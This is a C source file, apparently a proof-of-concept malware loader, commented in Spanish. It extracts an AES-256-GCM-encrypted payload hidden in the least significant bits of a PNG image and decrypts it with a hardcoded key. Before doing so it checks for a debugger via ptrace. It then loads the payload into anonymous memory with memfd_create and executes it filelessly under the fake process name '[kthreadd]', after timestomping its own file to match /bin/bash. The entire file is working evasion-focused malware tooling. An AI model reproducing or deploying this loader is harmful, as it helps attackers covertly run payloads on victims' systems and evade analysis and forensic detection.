#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <openssl/evp.h>
#include <time.h>
#include <utime.h>
#include <sys/ptrace.h>

#define STB_IMAGE_IMPLEMENTATION
#include "stb_image.h"

// Configuración
#define CARRIER_PATH "image.png"

// Clave AES-256 hardcoded (obtenida del builder)
unsigned char KEY[] = {
    0x7b, 0x95, 0xd3, 0x34, 0x84, 0x6f, 0x43, 0x56, 0x37, 0xc5, 0xdf, 0x0c, 0x37, 0x9f, 0x4b, 0x41,
    0x2a, 0x78, 0xa4, 0xad, 0x0b, 0x25, 0x1a, 0xa5, 0xfe, 0x57, 0xf0, 0x9a, 0xc0, 0x7b, 0xed, 0x12
};

// Anti-Analysis: Detección básica de ptrace
void check_ptrace() {
    if (ptrace(PTRACE_TRACEME, 0, 1, 0) < 0) {
        // Debugger detectado
        printf("Ptrace check failed\n");
        exit(0);
    }
}

// Anti-Analysis: Verificar entorno (ej. docker/.dockerenv)
void check_env() {
    if (access("/.dockerenv", F_OK) == 0) {
        // Estamos en docker (ignorar para este POC, pero en real se abortaría)
        // exit(0);
    }
}

// Descrifrado AES-GCM
unsigned char* decrypt_payload(unsigned char* ciphertext, int ciphertext_len, int* out_len) {
    if (ciphertext_len < 32) return NULL; // Nonce(12) + Tag(16) + Size(4)

    unsigned char nonce[12];
    unsigned char tag[16];
    int actual_size;

    memcpy(nonce, ciphertext, 12);
    memcpy(tag, ciphertext + 12, 16);
    memcpy(&actual_size, ciphertext + 28, 4); // Little endian unpack

    unsigned char* encrypted_data = ciphertext + 32;
    int encrypted_data_len = ciphertext_len - 32;

    EVP_CIPHER_CTX *ctx;
    int len;
    int plaintext_len;
    unsigned char *plaintext = (unsigned char*)malloc(encrypted_data_len);

    if(!(ctx = EVP_CIPHER_CTX_new())) return NULL;

    EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL);
    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, 12, NULL);
    EVP_DecryptInit_ex(ctx, NULL, NULL, KEY, nonce);
    EVP_DecryptUpdate(ctx, plaintext, &len, encrypted_data, encrypted_data_len);
    plaintext_len = len;

    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, 16, tag);
    int ret = EVP_DecryptFinal_ex(ctx, plaintext + len, &len);

    EVP_CIPHER_CTX_free(ctx);

    if(ret > 0) {
        plaintext_len += len;
        *out_len = actual_size; // Usar tamaño real empaquetado
        return plaintext;
    } else {
        free(plaintext);
        return NULL;
    }
}

// Timestomping
void timestomp(const char* target, const char* reference) {
    struct stat ref_stat;
    struct utimbuf new_times;

    if (stat(reference, &ref_stat) == 0) {
        new_times.actime = ref_stat.st_atime;
        new_times.modtime = ref_stat.st_mtime;
        utime(target, &new_times);
    }
}

int main(int argc, char *argv[]) {
    // 1. Checks defensivos
    check_ptrace();
    check_env();

    // 2. Cargar imagen y extraer LSB
    int width, height, channels;
    unsigned char *img = stbi_load(CARRIER_PATH, &width, &height, &channels, 3); // Forzar 3 canales
    if (!img) return 1;

    size_t total_pixels = width * height * 3;
    size_t extracted_size = total_pixels / 8; // 1 bit por byte de imagen
    unsigned char *extracted_data = (unsigned char*)malloc(extracted_size);
    memset(extracted_data, 0, extracted_size);

    // Extracción LSB
    // Importante: El orden de bits debe coincidir con np.unpackbits (big-endian por byte)
    for (size_t i = 0; i < extracted_size * 8; ++i) {
        if (i >= total_pixels) break;
        if (img[i] & 1) {
            extracted_data[i / 8] |= (1 << (7 - (i % 8)));
        }
    }
    stbi_image_free(img);

    // 3. Descifrar
    // Leer tamaño total del blob cifrado (primeros 4 bytes, Little Endian)
    uint32_t blob_size = 0;
    memcpy(&blob_size, extracted_data, 4);

    // printf("DEBUG: Blob size read: %d\n", blob_size);

    if (blob_size > extracted_size || blob_size == 0) {
         printf("Invalid blob size\n");
         return 1;
    }

    int payload_len = 0;
    // Pasar puntero desplazado +4 bytes y el tamaño exacto
    unsigned char *payload = decrypt_payload(extracted_data + 4, blob_size, &payload_len);
    free(extracted_data);

    if (!payload) { printf("Decrypt failed. Extracted size: %ld\n", extracted_size); return 1; }

    // 4. Inyección fileless (memfd_create)
    int fd = syscall(SYS_memfd_create, "kernel_worker", MFD_CLOEXEC);
    if (fd == -1) return 1;

    if (write(fd, payload, payload_len) != payload_len) return 1;

    // 5. Ejecución enmascarada
    // Timestomp self
    timestomp(argv[0], "/bin/bash");

    char fd_path[64];
    snprintf(fd_path, sizeof(fd_path), "/proc/self/fd/%d", fd);

    // Preparar argv modificado para enmascaramiento
    char *new_argv[] = { "[kthreadd]", NULL };

    // Execve
    fexecve(fd, new_argv, environ);

    // Si llegamos aqui, falló
    return 1;
}
